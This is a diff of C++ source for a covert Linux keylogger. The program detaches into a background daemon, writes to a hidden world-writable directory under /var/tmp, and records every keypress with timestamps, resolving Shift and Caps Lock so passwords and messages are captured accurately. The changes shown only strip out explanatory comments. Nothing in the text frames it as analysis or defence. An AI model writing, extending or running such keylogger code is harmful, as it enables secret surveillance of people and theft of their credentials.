@@ -27,7 +27,6 @@ map<int, string> keyMap = {
     {KEY_F9, "[F9]"}, {KEY_F10, "[F10]"}, {KEY_F11, "[F11]"}, {KEY_F12, "[F12]"}
 };
 
-// Special characters when Shift is held
 map<int, string> shiftMap = {
     {KEY_1, "!"}, {KEY_2, "@"}, {KEY_3, "#"}, {KEY_4, "$"},
     {KEY_5, "%"}, {KEY_6, "^"}, {KEY_7, "&"}, {KEY_8, "*"},
@@ -43,7 +42,7 @@ bool capsLockOn = false;
 void daemonize() {
     pid_t pid = fork();
     if (pid < 0) exit(EXIT_FAILURE);
-    if (pid > 0) exit(EXIT_SUCCESS); // Parent exits
+    if (pid > 0) exit(EXIT_SUCCESS); 
 
     umask(0);
     if (setsid() < 0) exit(EXIT_FAILURE);
@@ -64,7 +63,7 @@ void daemonize() {
 }
 
 int main() {
-    daemonize(); // Convert process into a daemon
+    daemonize(); 
 
     mkdir("/var/tmp/.hidden_keylog/", 0777);
     ofstream logFile("/var/tmp/.hidden_keylog/keylog.txt", ios::app);
@@ -83,21 +82,21 @@ int main() {
 
         if (event.type == EV_KEY) {
             if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
-                shiftPressed = (event.value != 0); // Pressed = true, Released = false
+                shiftPressed = (event.value != 0); 
             } else if (event.code == KEY_CAPSLOCK && event.value == 1) {
-                capsLockOn = !capsLockOn; // Toggle Caps Lock state
-            } else if (event.value == 1) { // Key Pressed
+                capsLockOn = !capsLockOn; 
+            } else if (event.value == 1) { 
                 time_t now = time(0);
                 tm* localTime = localtime(&now);
                 logFile << "[" << localTime->tm_hour << ":" << localTime->tm_min << ":" << localTime->tm_sec << "] ";
 
-                // Handling Shift and Caps Lock logic
+                
                 if (shiftPressed && shiftMap.find(event.code) != shiftMap.end()) {
-                    logFile << shiftMap[event.code];  // Print shifted symbols
+                    logFile << shiftMap[event.code];  
                 } else if (keyMap.find(event.code) != keyMap.end()) {
                     string key = keyMap[event.code];
                     
-                    // Convert letter case based on Shift and Caps Lock
+                    
                     if (key.length() == 1 && isalpha(key[0])) {
                         if (capsLockOn ^ shiftPressed) {
                             transform(key.begin(), key.end(), key.begin(), ::toupper);
